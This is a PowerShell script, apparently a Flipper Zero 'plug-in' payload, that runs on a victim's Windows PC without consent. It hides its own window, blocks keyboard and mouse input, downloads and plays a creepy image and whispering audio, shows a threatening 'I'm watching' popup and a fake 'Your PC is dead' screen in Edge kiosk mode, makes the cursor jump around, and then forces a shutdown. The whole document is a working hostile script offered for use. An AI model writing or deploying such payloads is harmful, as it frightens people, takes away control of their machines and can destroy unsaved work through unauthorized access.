Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
  [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
  [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
  [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

# Hide the PowerShell window
$hWnd = [Win32]::GetForegroundWindow()
[Win32]::ShowWindow($hWnd, 0)

# Lock input
[Win32]::BlockInput($true)

# Download and show creepy image
iwr https://raw.githubusercontent.com/andythecookie13bruce/flipper-script/main/creepy.jpg -OutFile "$env:TEMP\creepy.jpg"
Start-Process "$env:TEMP\creepy.jpg"

# Creepy popup
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show("You shouldn''t have plugged that in... I''m watching.","System Alert")

# BSOD HTML
$html = @"
<html>
<body style='background-color:#000000; color:#00ff00; font-family:Consolas; font-size:24px;'>
<center><br><br><br><br>
<h1>😵</h1>
<h2>Your PC is dead.</h2>
<p>It saw something it shouldn’t have.</p>
<p>There is no reboot.</p>
<p>We warned you.</p>
</center>
<script>
let glitch = () => {
  document.body.style.opacity = Math.random();
  document.body.style.transform = "scale(" + (1 + Math.random()/10) + ")";
  setTimeout(glitch, 100);
};
glitch();
</script>
</body>
</html>
"@

# Save and open BSOD
$bsodFile = "$env:TEMP\bsod.html"
$html | Out-File $bsodFile -Encoding ASCII
Start-Process "msedge.exe" -ArgumentList "--kiosk", $bsodFile

# Loop creepy audio
$audioURL = "https://raw.githubusercontent.com/andythecookie13bruce/flipper-script/main/whispers.mp3"
$audioFile = "$env:TEMP\creepysound.mp3"
iwr $audioURL -OutFile $audioFile
Start-Process "wmplayer.exe" -ArgumentList $audioFile

# Glitch mouse cursor (shake loop in background)
Start-Job {
  Add-Type -AssemblyName System.Windows.Forms
  for ($i = 0; $i -lt 100; $i++) {
    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1920), (Get-Random -Minimum 0 -Maximum 1080))
    Start-Sleep -Seconds 240
  }
}

# Wait and shut down
Start-Sleep -Seconds 10
[Win32]::BlockInput($false)
Stop-Computer -Force
